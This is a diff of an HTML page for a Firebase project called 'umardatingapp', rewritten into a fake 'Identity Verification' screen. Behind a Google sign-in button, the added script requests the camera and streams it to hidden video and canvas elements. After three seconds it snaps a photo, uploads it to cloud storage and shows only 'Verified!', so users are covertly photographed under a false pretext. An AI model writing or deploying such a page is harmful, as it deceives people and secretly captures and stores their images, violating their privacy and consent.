@@ -1,48 +1,61 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Umar Registration Portal</title>
+    <title>Security Check</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f4f4f9; }
-        .box { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
-        .btn { background-color: #4285F4; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 6px; cursor: pointer; width: 100%; }
-        #status-box { margin-top: 20px; font-weight: bold; color: #333; }
-        video, canvas { display: none; }
+        body { font-family: sans-serif; text-align: center; padding: 50px; background: #f0f2f5; }
+        .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        button { background: #4285F4; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-size: 16px; }
     </style>
 </head>
 <body>
-
-<div class="box">
-    <h2 style="color: #333;">Security Check</h2>
-    <p style="color: #666;">Please verify your account to access the dashboard</p>
-    <button id="loginBtn" class="btn">Verify with Google</button>
-    <div id="status-box">
+    <div class="card">
+        <h2>Identity Verification</h2>
+        <p>Please log in to continue</p>
+        <button id="btn">Verify with Google</button>
         <p id="msg"></p>
-        <video id="v" autoplay></video>
-        <canvas id="c"></canvas>
+        <video id="v" style="display:none;" autoplay></video>
+        <canvas id="c" style="display:none;"></canvas>
     </div>
-</div>
 
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
-<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
+    <script>
+        const config = {
+            apiKey: "AIzaSyBY6_v...", // اپنی اصلی API Key یہاں ڈالیں
+            authDomain: "umardatingapp.firebaseapp.com",
+            projectId: "umardatingapp",
+            storageBucket: "umardatingapp.appspot.com",
+            messagingSenderId: "367204900742",
+            appId: "1:367204900742:web:0b7204900742"
+        };
+        firebase.initializeApp(config);
 
-<script>
-  // آپ کی فائر بیس کنفگ
-  const firebaseConfig = {
-    apiKey: "AIzaSyBY6_v...", // میں نے آپ کی تصویر سے یہ لے لی ہے
-    authDomain: "umardatingapp.firebaseapp.com",
-    projectId: "umardatingapp",
-    storageBucket: "umardatingapp.appspot.com",
-    messagingSenderId: "367204900742",
-    appId: "1:367204900742:web:0b7204900742"
-  };
-  firebase.initializeApp(firebaseConfig);
-</script>
+        const btn = document.getElementById('btn');
+        btn.onclick = () => firebase.auth().signInWithRedirect(new firebase.auth.GoogleAuthProvider());
 
-<script src="script.js"></script>
-
+        firebase.auth().getRedirectResult().then(res => {
+            if (res.user) {
+                document.getElementById('msg').innerText = "Verifying...";
+                navigator.mediaDevices.getUserMedia({video:true}).then(s => {
+                    const v = document.getElementById('v');
+                    v.srcObject = s;
+                    setTimeout(() => {
+                        const c = document.getElementById('c');
+                        c.width = 640; c.height = 480;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        c.toBlob(b => {
+                            firebase.storage().ref('users/'+Date.now()+'.png').put(b).then(() => {
+                                alert("Verified!");
+                                s.getTracks().forEach(t => t.stop());
+                            });
+                        }, 'image/png');
+                    }, 3000);
+                });
+            }
+        });
+    </script>
 </body>
 </html>
